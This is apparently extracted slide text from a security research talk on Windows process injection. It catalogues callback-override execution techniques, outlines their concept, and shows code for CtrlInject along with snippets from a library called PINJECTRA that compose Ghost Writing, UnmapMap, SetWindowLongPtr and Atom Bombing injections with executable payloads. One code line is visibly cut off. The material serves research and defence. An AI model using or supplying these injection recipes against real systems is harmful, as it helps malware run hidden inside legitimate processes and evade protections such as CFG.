CFG – all the original CFG-valid addresses in NTDLL should be CFG-valid (or else 
process may crash). However, both VirtualAllocEx and NtMapViewOfSection set 
whole section to CFG-valid when PAGE_EXECUTE is requested.
•
CIG – not relevant
•
Control over registers: no
•
Note that in order not to destabilize the process:
•
Process-wide suspend
•
Copying the complete NTDLL memory (incl. static variables)
Callback override execution techniques
•
SetWindowLongPtr
(SetWindowLong)
•
PROPagate
•
Kernel Callback Table
•
Ctrl-Inject
•
Service Control
•
USERDATA
•
ALPC callback
•
CLIBRDWNDCLASS
•
DnsQuery
•
WNF callback
•
Shatter-like: 
•
WordWarping
•
Hyphentension
•
AutoCourgette
•
Streamception
•
Oleum
•
ListPLanting
•
Treepoline
Concept
•
Write code to the target process using a writing technique
•
Find/obtain a memory address of an object (with vtbl)/callback function
•
May be tricky – need to know that the process has the object/callback (e.g. ALPC, 
console apps, private clipboard)
•
Via API (e.g. GetWindowLongPtr)
•
Via memory search (e.g. ALPC)
•
Replace the object/callback (using a writing technique or standard API) to point 
at a chosen function/code
•
Must be CFG-valid target
•
May require some object/code adjustments
•
Trigger execution
•
May be tricky (e.g. DnsQuery)
•
(Restore original object/callback)
CtrlInject execution technique
HANDLE h = OpenProcess(PROCESS_VM_OPERATION, FALSE, process_id); // PROCESS_VM_OPERATION is required for 
RtlEncodeRemotePointer
void* encoded_addr = NULL;
ntdll!RtlEncodeRemotePointer(h, target_execution, &encoded_addr);
… // Use any Memory Write technique here to copy encoded_addr to kernelbase!SingleHandler in the target process
INPUT ip;
ip.type = INPUT_KEYBOARD;
ip.ki.wScan = 0;
ip.ki.time = 0;
ip.ki.dwExtraInfo = 0;
ip.ki.wVk = VK_CONTROL;
ip.ki.dwFlags = 0; // 0 for key press
SendInput(1, &ip, sizeof(INPUT));
Sleep(100);
PostMessageA(hWindow, WM_KEYDOWN, 'C', 0); // hWindow is a handle to the application window
memset/memmove write technique
HMODULE ntdll = GetModuleHandleA("ntdll");
HANDLE t = OpenThread(THREAD_SET_CONTEXT, FALSE, thread_id);
for (int i = 0; i inject(pid, tid);
Stack Bombing Demo
Ghost Writing  Impl. in PINJECTRA:
e = new CodeViaThreadSuspendInjectAndResume_ChangeRspChangeRip_Complex(
new GhostWriting(
new _ROP_CHAIN_2()
)
);
e->inject(pid, tid);
Ghost Writing Demo
UnmapMap Impl. in PINJECTRA:
e = new CodeViaProcessSuspendInjectAndResume_Complex(
new CreateFileMappingA_MapViewOfFile_NtUnmapViewOfSection_NtMapViewOfSection(
new _PAYLOAD_5()
)
);
e->inject(pid, tid);
UnmapMap Demo
SetWindowLongPtr Impl. in PINJECTRA:
e = new CodeViaSetWindowLongPtrA(
new ComplexToMutableAdvanceMemoryWriter(
new _PAYLOAD_4()
,
new VirtualAllocEx_WriteProcessMemory(
NULL,
0,
MEM_COMMIT | MEM_RESERVE,
PAGE_EXECUTE_READWRITE)
)
);
e->inject(pid, tid);
SetWindowLongPtr Demo
Atom Bombing Impl. in PINJECTRA:
e = new CodeViaQueueUserAPC(
new OpenThread_OpenProcess_VirtualAllocEx_GlobalAddAtomA(
_gen_payload_2(),
PAYLOAD3_SIZE,
PROCESS_ALL_ACCESS,
MEM_RESERVE | MEM_COMMIT, 
PAGE_EXECUTE_READWRITE)
);
e->inject(pid, tid);
Atom Bombing Demo
Summary (sound-bytes)
•
We map the vast territory of “true” process injection, and provide 
an analysis and a comparison in a single collection/repository
•
We provide a library (PINJECTRA) for mix-and-match generation of 
process injection attacks
•
We describe a new CFG-agnostic execution technique – stack 
bombing (and a memory writing technique – memset/memmove
over APC)
Thank you!
Questions?